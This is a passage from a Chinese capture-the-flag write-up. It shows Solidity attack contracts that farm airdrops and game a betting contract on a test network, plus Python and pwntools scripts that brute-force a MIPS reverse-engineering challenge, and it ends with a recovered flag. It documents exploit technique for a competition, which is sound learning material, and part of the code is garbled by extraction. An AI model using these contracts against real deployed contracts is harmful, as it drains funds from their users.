        function () payable {
        }
    }
    contract Son {
        function Son() payable {
            Fake3D f3d;
            f3d=Fake3D(0x4082cC8839242Ff5ee9c67f6D05C4e497f63361a);
            f3d.airDrop();
            if (f3d.balance(this)>=10)
            {
                f3d.transfer(0x4ecdDBF5C4aDBEE2d42bf9840183506Cf27c6D3f,10);
            }
            selfdestruct(0x4ecdDBF5C4aDBEE2d42bf9840183506Cf27c6D3f);
        }
        function () payable{
        }
    }
攻击完成后，提取flag时发现不对劲，有问题，怀疑winnerlist合约不对，找到了该合约真正的地址，并继续逆向：  
[https://ethervm.io/decompile?address=0xd229628fd201a391cf0c4ae6169133c1ed93d00a&network=ropsten](https://ethervm.io/decompile?address=0xd229628fd201a391cf0c4ae6169133c1ed93d00a&network=ropsten)  
简单来说，还需要满足用户的地址最后为0x43或倒数2位为0xb1. 用  
爆破，得到地址，转账，获取flag。
### EOSGAME
赌博游戏，赌就行了，写个攻击合约在一个block里面多赌几次。20%中100倍奖励，很划算
    contract EOSGame_exp{
        EOSGame eosgame;
        constructor() public{
            eosgame=EOSGame(0x804d8B0f43C57b5Ba940c1d1132d03f1da83631F);
        }
        function init() public{
            eosgame.initFund();
        }
        function small(uint times) public{
            for(uint i = 0; i  0 or val[p] != 0):
                if(val[p] == 0):
                    n -= 1
                p -= 1
            val[p] = j + 1
        return val
    def rev3(v):
        cnt = [0] * 9
        for i in xrange(9):
            j = 9 - i - 1
            cnt[j] = v % (j + 1)
            v /= j + 1
        val = [0] * 9
        for i in xrange(9):
            j = 9 - i - 1
            p = 8
            n = cnt[j]
            while(n > 0 or val[p] != 0):
                if(val[p] == 0):
                    n -= 1
                p -= 1
            val[p] = j + 1
        return val
    print(rev1(23333))
    print(rev2(23333))
    print(rev3(23333))
    print(rev1(77889))
    print(rev2(77889))
    print(rev3(77889))
第四个逆不动了, 根据前三个算法推测每组输入范围应该是1-9的全排列, 可以穷举. 改bin去掉两个`exit(-1)`再加个死循环.
    0x401A54 -> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0x401B5C -> 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    0x401BBE -> FF 23
    from pwn import *
    from itertools import permutations
    context.log_level = "warn"
    p = process(["qemu-mips", "mathgame1"])
    for c in permutations("123456789"):
        payload = "".join(c)
        payload = "167452983327856149162957438" + payload + "295316784823471695186379425" + payload
        p.sendafter("key:\n", payload)
        t = p.recvuntil("bingo!", True)
        if(t.count("fault!") != 2):
            print("".join(c))
flag:
`167452983327856149162957438125947638295316784823471695186379425514739682`